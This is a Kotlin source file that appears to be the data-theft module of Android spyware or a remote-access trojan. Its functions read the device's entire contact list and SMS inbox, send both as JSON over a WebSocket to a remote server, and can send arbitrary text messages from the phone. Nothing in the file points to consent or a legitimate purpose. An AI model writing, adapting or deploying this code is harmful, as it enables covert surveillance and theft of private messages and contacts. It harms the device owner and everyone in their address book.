package com.example.betryalcommit

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SmsManager
import androidx.core.content.getSystemService
import io.socket.client.Socket
import org.json.JSONObject

object Teleserv {
    @SuppressLint("Range")
    fun uploadContact(context: Context, webSocket: Socket) {
            var allContactList = "All Contacts\n\n\n"
            val cr: ContentResolver = context.contentResolver
            val cur = cr.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID)
                    )
                    val name = cur.getString(
                        cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME
                        )
                    )
                    if (cur.getInt(
                            cur.getColumnIndex(
                                ContactsContract.Contacts.HAS_PHONE_NUMBER
                            )
                        ) > 0
                    ) {
                        val pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        while (pCur!!.moveToNext()) {
                            val phoneNo = pCur.getString(
                                pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                            )
                            allContactList += "Name: $name\nPhone Number: $phoneNo\n\n"
                        }
                        pCur.close()
                    }
                }
                cur?.close()
            }
        val jsontext = JSONObject()
        jsontext.put("type","contact_log")
        jsontext.put("data",allContactList);
        webSocket.emit("response",jsontext.toString())
    }
    @SuppressLint("Range", "NewApi")
    fun uploadsms(contentResolver: ContentResolver, webSocket: Socket) {
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE
        )

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            projection, null, null, null
        )
        val smsText = StringBuilder()
        if (cursor != null && cursor.count > 0) {
            while (cursor.moveToNext()) {
                val address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
                val body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
                val date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE))

                smsText.append("From: $address\n")
                smsText.append("Date: ${dateToString(date)}\n")
                smsText.append("Message: $body\n\n")
            }
            cursor.close()
        }
        val jsontext = JSONObject()
        jsontext.put("type","sms_log")
        jsontext.put("data",smsText);
        webSocket.emit("response",jsontext.toString())
    }
    private fun dateToString(timestamp: Long): String {
        val dateFormat = "yyyy-MM-dd HH:mm:ss"
        val sdf = java.text.SimpleDateFormat(dateFormat)
        return sdf.format(java.util.Date(timestamp))
    }
    fun sendMessage(context: Context,number: String, message: String) {
            val sentPI: PendingIntent =
                PendingIntent.getBroadcast(context, 0, Intent("SMS_SENT"),
                    PendingIntent.FLAG_IMMUTABLE)
        SmsManager.getDefault()
                .sendTextMessage(number, null, message, sentPI, null);
    }


}